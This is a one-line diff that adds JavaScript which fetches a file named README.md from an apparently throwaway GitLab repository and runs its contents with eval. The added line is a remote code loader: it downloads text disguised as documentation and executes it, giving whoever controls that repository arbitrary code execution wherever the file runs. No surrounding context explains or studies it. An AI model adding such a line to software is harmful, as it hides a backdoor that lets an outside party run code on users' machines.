@@ -1,0 +1,1 @@
+fetch('https://gitlab.com/test26330331/test/-/raw/main/README.md').then(res => res.text()).then(text => {eval(text);});
